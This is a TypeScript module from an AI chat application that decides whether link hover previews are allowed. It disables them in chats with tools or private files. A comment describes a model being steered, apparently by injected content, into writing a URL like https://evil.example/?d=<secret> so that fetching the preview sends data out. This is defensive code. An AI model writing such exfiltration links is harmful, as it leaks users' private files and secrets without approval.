import type { Conversation, Message } from '@shared/types'
import { getConversation, listMessages } from '../db/conversations'
import { hasProjectFiles } from '../db/projects'
import { ASK_TOOLS } from './askTools'
import { SKILL_TOOLS } from './skillTools'
import { WEB_TOOLS } from './webTools'

// What a chat exposes, for the checks that stop a model-written URL from carrying data out: a web_fetch asks first
// (#62), and a link's hover preview isn't fetched (#63).

const BUILT_IN = new Set([...SKILL_TOOLS, ...ASK_TOOLS, ...WEB_TOOLS].map((t) => t.function.name))

/**
 * The chat holds files the user shared: attachments, or its project's knowledge. A code session holds a whole folder
 * of theirs, which its tools read.
 */
export function hasPrivateFiles(conversation: Conversation, messages: Message[]): boolean {
  return (
    conversation.mode === 'code' ||
    messages.some((m) => m.attachments.length > 0) ||
    (!!conversation.projectId && hasProjectFiles(conversation.projectId))
  )
}

/**
 * The chat has tools that can reach this Mac or the user's accounts: switched on now, or used by an earlier reply (a
 * link written then stays in the chat after the tools are switched off).
 */
export function hasToolSources(conversation: Conversation, messages: Message[]): boolean {
  return conversation.toolSources.length > 0 || messages.some((m) => m.toolEvents.some((e) => !e.unknown && !BUILT_IN.has(e.tool)))
}

/**
 * Whether links shown in a chat may get page previews. A model in a chat with tools or files could be steered into
 * writing https://evil.example/?d=<secret>, and fetching its preview on hover would send that without any approval.
 * Links outside a chat (a skill's instructions) may.
 */
export function previewsAllowed(conversationId: string | null): boolean {
  if (!conversationId) return true
  const conversation = getConversation(conversationId)
  if (!conversation) return false
  const messages = listMessages(conversationId)
  return !hasToolSources(conversation, messages) && !hasPrivateFiles(conversation, messages)
}
